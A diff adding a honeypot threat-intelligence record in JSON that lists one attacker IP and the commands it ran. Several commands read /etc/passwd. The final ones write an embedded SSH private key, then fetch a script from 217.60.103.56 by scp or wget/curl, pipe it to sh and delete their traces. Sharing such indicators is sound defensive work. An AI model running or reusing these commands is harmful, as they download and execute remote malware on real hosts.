@@ -1,0 +1,180 @@
+{
+  "Event": {
+    "uuid": "de74bc0c-2e6e-529f-a449-95afab2f1a08",
+    "info": "Sundew honeypot - campaign 4a4b096b82ea (1 sources) - id",
+    "date": "2026-09-17",
+    "analysis": "2",
+    "threat_level_id": "3",
+    "published": true,
+    "Orgc": {
+      "name": "Sundew honeypot",
+      "uuid": "3d06790b-d81d-56fb-9e82-4e5ee6b6de3c"
+    },
+    "Tag": [
+      {
+        "name": "type:OSINT"
+      },
+      {
+        "name": "tlp:clear"
+      },
+      {
+        "name": "sundew:class=\"attack\""
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "3eb144de-03aa-5ef0-b97b-c6947c222e56",
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": false,
+        "value": "2.29.38.95",
+        "timestamp": "1789603220",
+        "comment": "executed_commands, confidence medium; 1 sessions, 16 commands, 0 downloads; first_seen 2026-09-16T19:53:17.079415Z, last_seen 2026-09-16T19:54:18.411151Z; expires 7d after last_seen"
+      },
+      {
+        "uuid": "4b7b6e4b-c36b-5ce0-93bd-a911ee2389bf",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "id",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "dbf5141b-48fa-5e2d-8b27-fcf106e2775e",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "cat /etc/passwd",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "abadc694-4c47-52dd-8cf9-e2830f387ddd",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "7f4ed4ba-b491-511d-a8db-317c7db10ab5",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "enable",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "eb2e31d7-a6c5-5618-aec3-c6c19f6fa207",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "system",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "c99cc4ac-e719-5c9f-98d3-277b2dae8a42",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "shell",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "5cee3f4b-48dc-5fa1-9004-16ef71f4daf4",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "sh",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "13b30916-3b96-5a2c-a9be-f52a131e3327",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "bash",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "ce77d850-34b4-509c-9b5a-9c86336ed304",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "584a07cf-e7d1-5bd2-a701-1aeb2794dab8",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "e6ee9caf-670b-5cf5-b31e-a9edd41727b6",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "d4e36121-d744-5dd7-9a73-0a94f1b5f797",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "1dc226c4-66b4-585c-857e-be9ca7b63d79",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "b3473241-c9a5-5f77-ac40-54ef473aa2a8",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "931e21a2-8da8-58cc-acbf-249611417c64",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "58a207cc-847e-5a68-9538-8c4e7b560d96",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
+        "timestamp": "1789603220",
+        "comment": "command run by this campaign"
+      }
+    ]
+  }
+}
